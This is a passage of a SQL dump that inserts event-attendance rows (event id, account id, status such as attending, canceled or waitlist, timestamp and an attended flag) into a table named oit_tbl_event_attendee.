(178, 2876, 'attending', 1220496086, '0'),
(178, 2884, 'attending', 1220881208, '0'),
(178, 2937, 'canceled', 1221078977, '0'),
(179, 1996, 'attending', 1221838460, '0'),
(179, 2025, 'attending', 1221571359, '0'),
(179, 2042, 'attending', 1220531211, '0'),
(179, 2173, 'attending', 1221751408, '0'),
(179, 2213, 'attending', 1220547769, '0'),
(179, 2309, 'attending', 1220880046, '0'),
(179, 2579, 'attending', 1221104024, '0'),
(179, 2652, 'attending', 1221167072, '0'),
(179, 2677, 'attending', 1221658559, '0'),
(179, 2719, 'attending', 1220495863, '0'),
(179, 2754, 'attending', 1221831049, '0'),
(179, 2764, 'attending', 1221073078, '0'),
(179, 2875, 'attending', 1220502864, '0'),
(179, 2877, 'canceled', 1221661857, '0'),
(179, 2915, 'attending', 1220482779, '0'),
(179, 2937, 'attending', 1221664229, '0'),
(180, 2748, 'canceled', 1221673777, '0'),
(180, 2889, 'canceled', 1221580448, '0'),
(181, 2130, 'attending', 1221573292, '1'),
(181, 2186, 'attending', 1222194870, '1'),
(181, 2208, 'attending', 1222887628, '1'),
(181, 2211, 'attending', 1221572942, '1'),
(181, 2285, 'attending', 1221572971, '1'),
(181, 2392, 'attending', 1222182109, '1'),
(181, 2436, 'attending', 1222178999, '1'),
(181, 2622, 'attending', 1222178999, '1'),
(181, 2649, 'canceled', 1221572942, '0'),
(181, 2729, 'attending', 1222178999, '0'),
(181, 2847, 'attending', 1221572942, '1'),
(182, 2047, 'attending', 1223904964, '1'),
(182, 2106, 'attending', 1223566729, '1'),
(182, 2273, 'canceled', 1222975272, '0'),
(182, 2571, 'attending', 1223650146, '1'),
(182, 2703, 'attending', 1223908042, '1'),
(182, 2770, 'attending', 1222871015, '1'),
(182, 2923, 'canceled', 1222488588, '0'),
(183, 2047, 'attending', 1224265446, '0'),
(183, 2106, 'attending', 1223566826, '1'),
(183, 2273, 'canceled', 1222975340, '0'),
(183, 2332, 'attending', 1223650249, '1'),
(183, 2451, 'attending', 1224272598, '0'),
(183, 2490, 'attending', 1223670756, '0'),
(183, 2571, 'attending', 1224502204, '1'),
(183, 2636, 'attending', 1224508469, '0'),
(183, 2644, 'attending', 1224510515, '1'),
(183, 2703, 'attending', 1224273255, '1'),
(183, 2923, 'canceled', 1223697350, '0'),
(184, 2106, 'attending', 1223566890, '1'),
(184, 2145, 'attending', 1223662642, '1'),
(184, 2332, 'attending', 1223650295, '1'),
(184, 2451, 'canceled', 1224273896, '0'),
(184, 2636, 'canceled', 1224508817, '0'),
(184, 2644, 'canceled', 1224619701, '0'),
(184, 2703, 'attending', 1225128943, '1'),
(184, 2801, 'attending', 1223986966, '0'),
(185, 2145, 'attending', 1223662504, '1'),
(185, 2184, 'attending', 1223476563, '1'),
(185, 2273, 'canceled', 1222975759, '0'),
(185, 2351, 'canceled', 1223575603, '0'),
(185, 2491, 'attending', 1223905473, '1'),
(185, 2525, 'attending', 1223810215, '1'),
(185, 2895, 'attending', 1223920481, '0'),
(186, 1989, 'attending', 1224259700, '0'),
(186, 2251, 'canceled', 1224272791, '0'),
(186, 2317, 'canceled', 1224506861, '0'),
(186, 2419, 'attending', 1223389770, '1'),
(186, 2458, 'attending', 1223302251, '1'),
(186, 2483, 'attending', 1224272785, '1'),
(186, 2693, 'attending', 1223056454, '0'),
(186, 2772, 'canceled', 1224264923, '0'),
(186, 2802, 'attending', 1224508172, '1'),
(186, 2854, 'attending', 1223304257, '0'),
(187, 1989, 'attending', 1224684094, '1'),
(187, 2145, 'canceled', 1223662852, '0'),
(187, 2251, 'attending', 1224603903, '1'),
(187, 2425, 'attending', 1224511551, '1'),
(187, 2507, 'attending', 1224689340, '1'),
(187, 2740, 'canceled', 1223734873, '0'),
(187, 2767, 'attending', 1225841030, '1'),
(187, 2848, 'attending', 1224519605, '1'),
(188, 2163, 'attending', 1223907957, '1'),
(188, 2170, 'attending', 1224273802, '1'),
(188, 2193, 'canceled', 1224636173, '0'),
(188, 2258, 'canceled', 1223650278, '0'),
(188, 2395, 'attending', 1224262347, '1'),
(188, 2445, 'attending', 1224274014, '1'),
(188, 2448, 'attending', 1223662051, '1'),
(188, 2482, 'attending', 1224269003, '0'),
(188, 2502, 'attending', 1223905596, '1'),
(188, 2512, 'attending', 1224512491, '1'),
(188, 2535, 'attending', 1225288452, '1'),
(188, 2590, 'attending', 1223647256, '1'),
(188, 2634, 'attending', 1225729501, '1'),
(188, 2766, 'attending', 1224524934, '0'),
(188, 2782, 'attending', 1224782869, '1'),
(188, 2851, 'attending', 1224513079, '1'),
(189, 2272, 'canceled', 1227716198, '0'),
(189, 2361, 'attending', 1226421313, '0'),
(189, 2594, 'attending', 1224528608, '0'),
(189, 2666, 'canceled', 1224614023, '0'),
(189, 2832, 'canceled', 1224608205, '0'),
(190, 1981, 'attending', 1224090959, '0'),
(190, 2040, 'attending', 1224507656, '1'),
(190, 2258, 'canceled', 1223650544, '0'),
(190, 2315, 'attending', 1223037049, '1'),
(190, 2324, 'attending', 1225814761, '1'),
(190, 2395, 'attending', 1224764309, '1'),
(190, 2445, 'canceled', 1224273815, '0'),
(190, 2461, 'attending', 1223663101, '1'),
(190, 2482, 'attending', 1224269339, '0'),
(190, 2490, 'attending', 1224527729, '0'),
(190, 2498, 'canceled', 1224273752, '0'),
(190, 2512, 'canceled', 1224512399, '0'),
(190, 2514, 'attending', 1228450513, '0'),
(190, 2591, 'attending', 1228333672, '0'),
(190, 2851, 'attending', 1224513160, '0'),
(190, 2895, 'canceled', 1223920385, '0'),
(190, 2923, 'canceled', 1228403684, '0'),
(191, 2378, 'attending', 1228336999, '1'),
(191, 2475, 'attending', 1228335856, '1'),
(191, 2498, 'canceled', 1224274226, '0'),
(191, 2514, 'attending', 1226595834, '0'),
(191, 2520, 'attending', 1228401106, '1'),
(191, 2591, 'attending', 1226072840, '0'),
(191, 2788, 'attending', 1225140592, '1'),
(191, 2816, 'attending', 1224594613, '0'),
(192, 1981, 'attending', 1224090898, '1'),
(192, 2008, 'attending', 1224600908, '0'),
(192, 2040, 'attending', 1224512447, '1'),
(192, 2258, 'canceled', 1223650428, '0'),
(192, 2315, 'attending', 1223037014, '1'),
(192, 2324, 'attending', 1228420014, '1'),
(192, 2395, 'attending', 1224262304, '1'),
(192, 2445, 'canceled', 1224273151, '0'),
(192, 2461, 'attending', 1223663059, '1'),
(192, 2482, 'attending', 1224268535, '0'),
(192, 2491, 'canceled', 1223905548, '0'),
(192, 2494, 'attending', 1224270821, '1'),
(192, 2498, 'canceled', 1224273710, '0'),
(192, 2512, 'attending', 1224600938, '1'),
(192, 2535, 'attending', 1228417374, '0'),
(192, 2558, 'canceled', 1228403646, '0'),
(192, 2816, 'attending', 1224074992, '0'),
(192, 2851, 'attending', 1228333648, '0'),
(192, 2895, 'canceled', 1223920303, '0'),
(192, 2905, 'attending', 1223884662, '0'),
(193, 2258, 'canceled', 1224704386, '0'),
(193, 2315, 'attending', 1228497512, '1'),
(193, 2324, 'attending', 1225377476, '1'),
(193, 2395, 'attending', 1225297060, '1'),
(193, 2445, 'canceled', 1224273949, '0'),
(193, 2461, 'attending', 1228855542, '1'),
(193, 2498, 'canceled', 1224273780, '0'),
(193, 2512, 'canceled', 1224512432, '0'),
(193, 2514, 'attending', 1226595897, '0'),
(193, 2571, 'attending', 1228406674, '1'),
(193, 2591, 'attending', 1226074056, '0'),
(193, 2594, 'attending', 1224528721, '1'),
(193, 2851, 'attending', 1224513192, '0'),
(193, 2923, 'canceled', 1226093722, '0'),
(194, 1993, 'canceled', 1223959461, '0'),
(194, 2145, 'attending', 1223661955, '1'),
(194, 2351, 'attending', 1223991901, '1'),
(194, 2665, 'attending', 1223667540, '1'),
(194, 2740, 'canceled', 1223734502, '0'),
(194, 2750, 'attending', 1223661015, '1'),
(195, 2136, 'attending', 1224276732, '1'),
(195, 2145, 'attending', 1223662048, '1'),
(195, 2351, 'canceled', 1223992394, '0'),
(195, 2451, 'canceled', 1224273803, '0'),
(195, 2482, 'canceled', 1224270822, '0'),
(195, 2636, 'canceled', 1224508743, '0'),
(195, 2665, 'attending', 1223667597, '1'),
(195, 2740, 'canceled', 1223734540, '0'),
(195, 2750, 'attending', 1223661111, '1'),
(195, 2841, 'attending', 1223900821, '1'),
(196, 2145, 'attending', 1223662100, '0'),
(196, 2351, 'canceled', 1224686597, '0'),
(196, 2636, 'canceled', 1224508849, '0'),
(196, 2665, 'attending', 1223667624, '0'),
(196, 2740, 'canceled', 1223734546, '0'),
(196, 2750, 'attending', 1223661082, '0'),
(196, 2801, 'attending', 1223986914, '0'),
(197, 2136, 'attending', 1224276778, '0'),
(197, 2145, 'attending', 1223662176, '0'),
(197, 2351, 'attending', 1225386618, '0'),
(197, 2636, 'canceled', 1224509311, '0'),
(197, 2665, 'attending', 1223667652, '0'),
(197, 2740, 'canceled', 1223734553, '0'),
(197, 2750, 'attending', 1223661054, '0'),
(198, 2098, 'canceled', 1224508315, '0'),
(198, 2285, 'canceled', 1224163241, '0'),
(198, 2512, 'canceled', 1224512754, '0'),
(198, 2740, 'canceled', 1223734649, '0'),
(198, 2797, 'canceled', 1224272269, '0'),
(199, 2285, 'attending', 1225197457, '1'),
(199, 2457, 'attending', 1224260433, '1'),
(199, 2491, 'attending', 1223905787, '0'),
(199, 2498, 'attending', 1224274079, '0'),
(199, 2512, 'attending', 1224513604, '1'),
(199, 2688, 'attending', 1224271858, '1'),
(199, 2761, 'attending', 1224261617, '1'),
(200, 2124, 'attending', 1229021748, '1'),
(200, 2163, 'canceled', 1223908005, '0'),
(200, 2192, 'canceled', 1223667373, '0'),
(200, 2244, 'attending', 1225736646, '1'),
(200, 2448, 'attending', 1223663062, '1'),
(200, 2514, 'attending', 1226595950, '0'),
(200, 2591, 'attending', 1226073830, '1'),
(201, 2552, 'canceled', 1224244809, '0'),
(201, 2859, 'canceled', 1224185600, '0'),
(202, 2655, 'attending', 1225812797, '0'),
(202, 2665, 'canceled', 1223667376, '0'),
(202, 2777, 'attending', 1225913332, '0'),
(203, 2040, 'canceled', 1224514297, '0'),
(203, 2109, 'attending', 1224824235, '0'),
(203, 2174, 'attending', 1223901000, '0'),
(203, 2348, 'attending', 1227714491, '0'),
(203, 2386, 'attending', 1227115822, '0'),
(203, 2403, 'attending', 1224098652, '0'),
(203, 2726, 'attending', 1224518134, '0'),
(204, 1982, 'attending', 1223412931, '1'),
(204, 2001, 'attending', 1223407292, '1'),
(204, 2071, 'attending', 1223986716, '1'),
(204, 2151, 'attending', 1223574228, '1'),
(204, 2219, 'attending', 1223485232, '1'),
(204, 2285, 'attending', 1223988366, '1'),
(204, 2338, 'attending', 1223412892, '1'),
(204, 2392, 'attending', 1223405381, '1'),
(204, 2436, 'attending', 1223918916, '1'),
(204, 2458, 'attending', 1223553679, '1'),
(204, 2561, 'attending', 1223411420, '1'),
(204, 2729, 'attending', 1223909323, '1'),
(204, 2889, 'attending', 1223406641, '1'),
(204, 2910, 'attending', 1223414125, '1'),
(205, 2847, 'canceled', 1223562565, '0'),
(206, 2048, 'attending', 1223924900, '0'),
(206, 2253, 'attending', 1224080540, '1'),
(206, 2281, 'attending', 1224272215, '1'),
(206, 2523, 'attending', 1224516455, '1'),
(206, 2847, 'attending', 1224598975, '1'),
(206, 2888, 'attending', 1224271676, '1'),
(207, 2285, 'canceled', 1224163375, '0'),
(208, 2172, 'attending', 1225290666, '1'),
(208, 2207, 'attending', 1224246265, '0'),
(208, 2285, 'attending', 1224163126, '1'),
(208, 2507, 'attending', 1224246616, '1'),
(208, 2884, 'attending', 1225288651, '0'),
(210, 2069, 'attending', 1224772177, '1'),
(210, 2121, 'attending', 1224184637, '0'),
(210, 2141, 'attending', 1224683824, '1'),
(210, 2146, 'attending', 1224184052, '0'),
(210, 2172, 'attending', 1224773976, '1'),
(210, 2179, 'canceled', 1224244932, '0'),
(210, 2213, 'attending', 1224681256, '1'),
(210, 2285, 'attending', 1224172386, '1'),
(210, 2297, 'canceled', 1224189204, '0'),
(210, 2319, 'attending', 1224678675, '1'),
(210, 2358, 'attending', 1224684810, '1'),
(210, 2423, 'attending', 1224775545, '1'),
(210, 2455, 'canceled', 1224759956, '0'),
(210, 2492, 'attending', 1224266300, '1'),
(210, 2552, 'attending', 1224255162, '1'),
(210, 2665, 'attending', 1224769276, '1'),
(210, 2786, 'attending', 1224699367, '0'),
(210, 2847, 'canceled', 1224256211, '0'),
(210, 2872, 'attending', 1224775827, '1'),
(211, 1991, 'attending', 1227219543, '0'),
(211, 2069, 'attending', 1225809493, '0'),
(211, 2110, 'attending', 1225983637, '0'),
(211, 2152, 'attending', 1227223781, '0'),
(211, 2244, 'attending', 1225809683, '0'),
(211, 2310, 'attending', 1227215154, '0'),
(211, 2392, 'attending', 1225749863, '0'),
(211, 2467, 'attending', 1225898930, '0'),
(211, 2469, 'attending', 1225750035, '0'),
(211, 2507, 'attending', 1225976387, '1'),
(211, 2523, 'attending', 1226074876, '0'),
(211, 2557, 'attending', 1225899725, '0'),
(211, 2560, 'attending', 1225897123, '0'),
(211, 2568, 'attending', 1227287162, '0'),
(211, 2655, 'attending', 1225812821, '0'),
(211, 2700, 'attending', 1227214231, '0'),
(211, 2724, 'attending', 1225923899, '0'),
(211, 2767, 'attending', 1225751231, '0'),
(211, 2777, 'attending', 1225811022, '0'),
(211, 2817, 'attending', 1225751533, '0'),
(211, 2853, 'attending', 1227217415, '0'),
(211, 2931, 'attending', 1226348507, '0'),
(213, 2089, 'attending', 1226926682, '1'),
(213, 2095, 'attending', 1225985041, '0'),
(213, 2118, 'attending', 1227030696, '0'),
(213, 2410, 'attending', 1225995498, '1'),
(213, 2423, 'attending', 1226433298, '0'),
(213, 2591, 'attending', 1226072657, '0'),
(213, 2598, 'attending', 1227196592, '0'),
(213, 2779, 'attending', 1227101420, '1'),
(213, 2872, 'attending', 1227286282, '0'),
(213, 2884, 'attending', 1227194045, '0'),
(214, 2095, 'canceled', 1225984991, '0'),
(214, 2288, 'attending', 1226502290, '1'),
(214, 2410, 'attending', 1225995330, '1'),
(214, 2423, 'attending', 1226433277, '1'),
(214, 2622, 'attending', 1226432065, '1'),
(214, 2628, 'attending', 1225985217, '1'),
(214, 2775, 'attending', 1225999900, '0'),
(215, 1976, 'attending', 1227103750, '1'),
(215, 2005, 'attending', 1227101979, '1'),
(215, 2020, 'attending', 1227127311, '1'),
(215, 2090, 'attending', 1227111471, '1'),
(215, 2122, 'attending', 1227130531, '1'),
(215, 2129, 'canceled', 1227128695, '0'),
(215, 2162, 'canceled', 1227129403, '0'),
(215, 2165, 'attending', 1227126784, '1'),
(215, 2175, 'attending', 1227129374, '1'),
(215, 2213, 'attending', 1227128974, '1'),
(215, 2242, 'attending', 1228254611, '1'),
(215, 2302, 'attending', 1227046184, '1'),
(215, 2310, 'attending', 1226949261, '1'),
(215, 2319, 'attending', 1228254603, '1'),
(215, 2338, 'attending', 1227058720, '1'),
(215, 2348, 'attending', 1228254614, '1'),
(215, 2405, 'attending', 1227045673, '1'),
(215, 2416, 'attending', 1228254599, '1'),
(215, 2429, 'attending', 1227110722, '1'),
(215, 2433, 'canceled', 1227102385, '0'),
(215, 2469, 'canceled', 1226947095, '0'),
(215, 2492, 'canceled', 1227129715, '0'),
(215, 2560, 'attending', 1228254606, '1'),
(215, 2599, 'canceled', 1227127671, '0'),
(215, 2667, 'attending', 1227127384, '1'),
(215, 2685, 'attending', 1227114493, '1'),
(215, 2701, 'attending', 1227128016, '1'),
(215, 2714, 'attending', 1227129350, '1'),
(215, 2723, 'canceled', 1227104551, '0'),
(215, 2777, 'attending', 1226937111, '1'),
(215, 2817, 'attending', 1227646631, '1'),
(215, 2887, 'attending', 1227129563, '1'),
(215, 2928, 'attending', 1227127373, '1'),
(216, 1976, 'canceled', 1227103785, '0'),
(216, 1991, 'attending', 1227045348, '1'),
(216, 1996, 'attending', 1227067079, '1'),
(216, 2005, 'attending', 1227049669, '1'),
(216, 2053, 'attending', 1227100461, '1'),
(216, 2068, 'attending', 1227097313, '1'),
(216, 2090, 'attending', 1227111438, '1'),
(216, 2133, 'canceled', 1227045153, '0'),
(216, 2162, 'canceled', 1229114501, '0'),
(216, 2165, 'attending', 1227127149, '1'),
(216, 2175, 'attending', 1229114498, '1'),
(216, 2213, 'attending', 1229114493, '1'),
(216, 2214, 'attending', 1227044727, '1'),
(216, 2302, 'attending', 1227046240, '1'),
(216, 2338, 'attending', 1227058803, '1'),
(216, 2353, 'attending', 1227045373, '1'),
(216, 2390, 'attending', 1227098777, '1'),
(216, 2400, 'attending', 1227044809, '1'),
(216, 2429, 'attending', 1227110765, '1'),
(216, 2433, 'attending', 1227102524, '1'),
(216, 2469, 'canceled', 1226947160, '0'),
(216, 2569, 'attending', 1227128675, '1'),
(216, 2667, 'attending', 1227128167, '0'),
(216, 2685, 'attending', 1227114675, '1'),
(216, 2714, 'attending', 1229114505, '1'),
(216, 2723, 'attending', 1227104578, '\0'),
(216, 2777, 'attending', 1226937166, '1'),
(216, 2779, 'attending', 1227101087, '1'),
(216, 2809, 'attending', 1227045213, '1'),
(216, 2887, 'attending', 1229114508, '1'),
(217, 2001, 'attending', 1229367258, '1'),
(217, 2032, 'attending', 1229368752, '1'),
(217, 2076, 'attending', 1228915108, '1'),
(217, 2217, 'attending', 1228753179, '1'),
(217, 2219, 'attending', 1229368915, '1'),
(217, 2285, 'attending', 1229006909, '0'),
(217, 2560, 'attending', 1229350707, '1'),
(217, 2561, 'attending', 1229371945, '1'),
(217, 2680, 'attending', 1228752980, '1'),
(219, 1982, 'attending', 1229613019, '1'),
(219, 1983, 'attending', 1229607337, '1'),
(219, 1991, 'attending', 1228852264, '1'),
(219, 1996, 'attending', 1229625751, '1'),
(219, 2001, 'attending', 1228939178, '1'),
(219, 2035, 'attending', 1228854210, '1'),
(219, 2057, 'attending', 1229104036, '1'),
(219, 2067, 'attending', 1229538811, '1'),
(219, 2068, 'attending', 1228921675, '1'),
(219, 2077, 'attending', 1229540026, '1'),
(219, 2089, 'attending', 1228852319, '1'),
(219, 2122, 'attending', 1228853493, '1'),
(219, 2133, 'attending', 1228856217, '1'),
(219, 2144, 'attending', 1229542539, '1'),
(219, 2159, 'attending', 1229541871, '1'),
(219, 2165, 'attending', 1228930250, '1'),
(219, 2180, 'attending', 1228852328, '1'),
(219, 2187, 'attending', 1229539069, '1'),
(219, 2188, 'attending', 1229551886, '1'),
(219, 2247, 'attending', 1229391565, '1'),
(219, 2268, 'attending', 1229609336, '1'),
(219, 2308, 'attending', 1228857963, '1'),
(219, 2319, 'attending', 1228854864, '1'),
(219, 2333, 'attending', 1229099569, '1'),
(219, 2334, 'attending', 1229541080, '1'),
(219, 2343, 'attending', 1229534634, '1'),
(219, 2353, 'attending', 1228854187, '1'),
(219, 2416, 'attending', 1228853361, '1'),
(219, 2423, 'attending', 1228852658, '1'),
(219, 2443, 'attending', 1229007044, '1'),
(219, 2454, 'attending', 1229106176, '1'),
(219, 2462, 'attending', 1228853477, '1'),
(219, 2469, 'attending', 1228857440, '1'),
(219, 2499, 'attending', 1228857871, '1'),
(219, 2560, 'attending', 1228918964, '1'),
(219, 2618, 'attending', 1229539353, '1'),
(219, 2655, 'attending', 1228852190, '1'),
(219, 2667, 'attending', 1229539214, '1'),
(219, 2732, 'attending', 1229624679, '1'),
(219, 2774, 'attending', 1229549131, '1'),
(219, 2787, 'attending', 1229605097, '1'),
(219, 2809, 'canceled', 1228935932, '0'),
(219, 2847, 'attending', 1229627073, '1'),
(219, 2858, 'attending', 1229007015, '1'),
(219, 2939, 'canceled', 1229107267, '0'),
(220, 2001, 'attending', 1229018253, '0'),
(220, 2089, 'attending', 1229609951, '0'),
(220, 2124, 'attending', 1229021551, '0'),
(220, 2375, 'attending', 1229458614, '0'),
(220, 2443, 'attending', 1229007396, '0'),
(220, 2548, 'attending', 1229534624, '0'),
(220, 2787, 'attending', 1229605006, '0'),
(220, 2847, 'attending', 1229116310, '0'),
(220, 2858, 'attending', 1229007054, '0'),
(220, 2884, 'attending', 1229547180, '0'),
(221, 1983, 'attending', 1229607399, '0'),
(221, 1991, 'attending', 1231191758, '1'),
(221, 2089, 'attending', 1229610012, '1'),
(221, 2129, 'attending', 1231785234, '1'),
(221, 2130, 'attending', 1231174110, '1'),
(221, 2211, 'attending', 1231170893, '1'),
(221, 2330, 'attending', 1231269332, '1'),
(221, 2379, 'attending', 1231770647, '0'),
(221, 2407, 'attending', 1231253939, '0'),
(221, 2423, 'canceled', 1231515633, '0'),
(221, 2519, 'attending', 1231862702, '1'),
(221, 2530, 'attending', 1229981062, '1'),
(221, 2597, 'attending', 1229905516, '1'),
(221, 2652, 'attending', 1229548418, '1'),
(221, 2847, 'attending', 1231170436, '1'),
(221, 2872, 'attending', 1231787775, '1'),
(222, 2159, 'canceled', 1231883959, '0'),
(222, 2379, 'canceled', 1232039561, '0'),
(223, 2012, 'attending', 1233848118, '0'),
(223, 2089, 'attending', 1234198816, '1'),
(223, 2105, 'attending', 1231940992, '1'),
(223, 2131, 'attending', 1233756823, '1'),
(223, 2159, 'attending', 1231884052, '1'),
(223, 2172, 'attending', 1232638193, '1'),
(223, 2190, 'attending', 1233754499, '0'),
(223, 2211, 'attending', 1232551632, '1'),
(223, 2265, 'attending', 1233687484, '1'),
(223, 2277, 'attending', 1233758599, '0'),
(223, 2308, 'attending', 1232571507, '1'),
(223, 2329, 'attending', 1234276213, '1'),
(223, 2375, 'attending', 1233678096, '1'),
(223, 2376, 'attending', 1233687032, '1'),
(223, 2404, 'attending', 1233754997, '1'),
(223, 2507, 'attending', 1233673833, '1'),
(223, 2513, 'attending', 1234190508, '0'),
(223, 2538, 'attending', 1232561010, '1'),
(223, 2602, 'attending', 1233754499, '0'),
(223, 2618, 'canceled', 1233687980, '0'),
(223, 2683, 'attending', 1233673945, '1'),
(223, 2731, 'attending', 1234291595, '1'),
(223, 2801, 'canceled', 1233754499, '0'),
(223, 2838, 'attending', 1233161910, '1'),
(223, 2858, 'attending', 1232560856, '0'),
(223, 2884, 'attending', 1233681934, '0'),
(223, 2898, 'attending', 1233689584, '1'),
(223, 2936, 'attending', 1233754499, '1'),
(224, 2030, 'attending', 1233259883, '1'),
(224, 2086, 'attending', 1232740672, '0'),
(224, 2105, 'attending', 1233077922, '1'),
(224, 2132, 'canceled', 1233689610, '0'),
(224, 2187, 'waitlist', 1233692587, '0'),
(224, 2215, 'attending', 1233159027, '1'),
(224, 2223, 'waitlist', 1233690942, '0'),
(224, 2266, 'attending', 1233062549, '0'),
(224, 2296, 'attending', 1233623471, '1'),
(224, 2314, 'attending', 1233591621, '1'),
(224, 2348, 'attending', 1234187484, '1'),
(224, 2358, 'attending', 1233676308, '1'),
(224, 2370, 'attending', 1233688910, '1'),
(224, 2507, 'attending', 1233675315, '1'),
(224, 2682, 'attending', 1233165894, '0'),
(224, 2729, 'canceled', 1233687461, '0'),
(224, 2756, 'attending', 1233092304, '1'),
(224, 2788, 'waitlist', 1233801179, '0'),
(224, 2936, 'waitlist', 1233703998, '0'),
(225, 2105, 'attending', 1233080925, '1'),
(225, 2164, 'canceled', 1234272376, '0'),
(225, 2187, 'canceled', 1233692627, '0'),
(225, 2215, 'attending', 1233159439, '1'),
(225, 2296, 'attending', 1234207265, '0'),
(225, 2314, 'attending', 1233595326, '0'),
(225, 2348, 'canceled', 1233691202, '0'),
(225, 2370, 'attending', 1233689096, '1'),
(225, 2507, 'attending', 1233675349, '1'),
(225, 2596, 'attending', 1232980314, '1'),
(225, 2708, 'attending', 1233859620, '1'),
(225, 2756, 'attending', 1233092430, '1'),
(225, 2936, 'attending', 1233704049, '1'),
(226, 2105, 'attending', 1233081091, '1'),
(226, 2215, 'attending', 1233159682, '1'),
(226, 2296, 'canceled', 1234207288, '0'),
(226, 2340, 'attending', 1232650656, '0'),
(226, 2348, 'canceled', 1233692085, '0'),
(226, 2370, 'attending', 1233689155, '1'),
(226, 2406, 'canceled', 1233178783, '0'),
(226, 2507, 'attending', 1233675396, '1'),
(226, 2596, 'canceled', 1232980414, '0'),
(226, 2678, 'canceled', 1234796252, '0'),
(226, 2708, 'attending', 1233859656, '0'),
(226, 2756, 'attending', 1233092477, '1'),
(226, 2936, 'attending', 1233704129, '1'),
(227, 2030, 'attending', 1233259029, '1'),
(227, 2056, 'attending', 1233699213, '1'),
(227, 2086, 'canceled', 1232746512, '0'),
(227, 2147, 'attending', 1233084896, '1'),
(227, 2229, 'attending', 1233942429, '1'),
(227, 2266, 'attending', 1233062742, '0'),
(227, 2285, 'attending', 1234191974, '0'),
(227, 2314, 'attending', 1233591722, '1'),
(227, 2340, 'canceled', 1232650346, '0'),
(227, 2402, 'attending', 1233258560, '1'),
(227, 2678, 'attending', 1234796451, '1'),
(227, 2708, 'attending', 1233860114, '1'),
(227, 2751, 'attending', 1234547572, '1'),
(227, 2756, 'attending', 1234383593, '1'),
(227, 2936, 'attending', 1233705261, '1'),
(228, 2348, 'canceled', 1233691109, '0'),
(228, 2750, 'attending', 1233690365, '1'),
(228, 2776, 'attending', 1233758586, '1'),
(228, 2883, 'canceled', 1233689528, '0'),
(228, 2936, 'attending', 1233076387, '1'),
(229, 2105, 'attending', 1233341337, '1'),
(229, 2229, 'attending', 1233942364, '1'),
(229, 2358, 'canceled', 1234280803, '0'),
(229, 2443, 'attending', 1233934576, '1'),
(229, 2466, 'attending', 1233157164, '1'),
(229, 2507, 'attending', 1233674933, '1'),
(229, 2546, 'attending', 1234271057, '1'),
(229, 2708, 'attending', 1233859561, '1'),
(229, 2756, 'attending', 1233609284, '1'),
(229, 2797, 'attending', 1233157279, '1'),
(229, 2808, 'attending', 1233159437, '1'),
(229, 2936, 'attending', 1233705742, '1'),
(230, 2000, 'canceled', 1233693108, '0'),
(230, 2033, 'canceled', 1234196301, '0'),
(230, 2072, 'canceled', 1233691489, '0'),
(230, 2086, 'attending', 1232746634, '1'),
(230, 2098, 'attending', 1233690307, '1'),
(230, 2187, 'canceled', 1233689426, '0'),
(230, 2205, 'canceled', 1233695611, '0'),
(230, 2234, 'attending', 1233691720, '1'),
(230, 2395, 'attending', 1232739275, '1'),
(230, 2480, 'attending', 1233689450, '1'),
(230, 2501, 'canceled', 1233693009, '0'),
(230, 2521, 'attending', 1233690569, '1'),
(230, 2538, 'canceled', 1233692315, '0'),
(230, 2584, 'attending', 1233002523, '1'),
(230, 2696, 'attending', 1233690392, '1'),
(230, 2722, 'canceled', 1233689918, '0'),
(230, 2729, 'attending', 1235484108, '1'),
(230, 2787, 'attending', 1233689362, '1'),
(230, 2788, 'canceled', 1233690593, '0'),
(230, 2812, 'canceled', 1233714082, '0'),
(230, 2881, 'canceled', 1233689274, '0'),
(230, 2888, 'attending', 1233688923, '1'),
(230, 2897, 'attending', 1235493959, '1'),
(230, 2936, 'attending', 1233076706, '1'),
(231, 2008, 'attending', 1232903803, '1'),
(231, 2030, 'attending', 1233259689, '1'),
(231, 2086, 'canceled', 1232746468, '0'),
(231, 2105, 'attending', 1233082919, '1'),
(231, 2164, 'attending', 1234793836, '1'),
(231, 2224, 'attending', 1233706069, '1'),
(231, 2296, 'attending', 1234792975, '1'),
(231, 2348, 'canceled', 1233691298, '0'),
(231, 2358, 'canceled', 1233676645, '0');
INSERT INTO `oit_tbl_event_attendee` (`eventId`, `accountId`, `status`, `timestamp`, `attended`) VALUES
(231, 2395, 'canceled', 1232739345, '0'),
(231, 2406, 'attending', 1233178843, '0'),
(231, 2488, 'waitlist', 1234619882, '0'),
(231, 2494, 'attending', 1232740145, '1'),
(231, 2596, 'attending', 1232978349, '1'),
(231, 2756, 'waitlist', 1234383974, '0'),
(231, 2797, 'attending', 1233157462, '1'),
(231, 2827, 'waitlist', 1234656092, '0'),
(231, 2936, 'attending', 1233076060, '1'),
(232, 2008, 'attending', 1232974372, '1'),
(232, 2086, 'canceled', 1232746544, '0'),
(232, 2105, 'attending', 1233083731, '1'),
(232, 2164, 'waitlist', 1234898109, '0'),
(232, 2224, 'attending', 1233706199, '0'),
(232, 2296, 'attending', 1235408822, '1'),
(232, 2348, 'canceled', 1233691708, '0'),
(232, 2395, 'canceled', 1232739415, '0'),
(232, 2402, 'attending', 1233258727, '1'),
(232, 2494, 'attending', 1232740276, '1'),
(232, 2596, 'attending', 1232978544, '1'),
(232, 2708, 'attending', 1233859725, '1'),
(232, 2756, 'waitlist', 1235085093, '0'),
(232, 2797, 'attending', 1233157527, '1'),
(232, 2827, 'attending', 1234793024, '1'),
(232, 2936, 'attending', 1233076446, '1'),
(233, 2008, 'attending', 1232974436, '1'),
(233, 2086, 'attending', 1235624423, '1'),
(233, 2105, 'attending', 1233341709, '1'),
(233, 2147, 'canceled', 1233084753, '0'),
(233, 2164, 'canceled', 1234271847, '0'),
(233, 2224, 'attending', 1233706285, '1'),
(233, 2243, 'canceled', 1235598598, '0'),
(233, 2296, 'attending', 1234883546, '1'),
(233, 2348, 'canceled', 1233691806, '0'),
(233, 2402, 'canceled', 1233258778, '0'),
(233, 2494, 'attending', 1232740304, '1'),
(233, 2596, 'canceled', 1232980125, '0'),
(233, 2708, 'attending', 1233859788, '1'),
(233, 2797, 'attending', 1233157593, '1'),
(233, 2936, 'attending', 1233076462, '1'),
(234, 2164, 'canceled', 1234271960, '0'),
(234, 2224, 'attending', 1233706769, '1'),
(234, 2296, 'canceled', 1234883571, '0'),
(234, 2348, 'canceled', 1233691928, '0'),
(234, 2494, 'canceled', 1234893057, '0'),
(234, 2596, 'canceled', 1233635124, '0'),
(234, 2708, 'canceled', 1233859823, '0'),
(234, 2797, 'attending', 1233157657, '1'),
(234, 2936, 'attending', 1233076486, '1'),
(235, 2105, 'canceled', 1233078284, '0'),
(235, 2370, 'canceled', 1233690181, '0'),
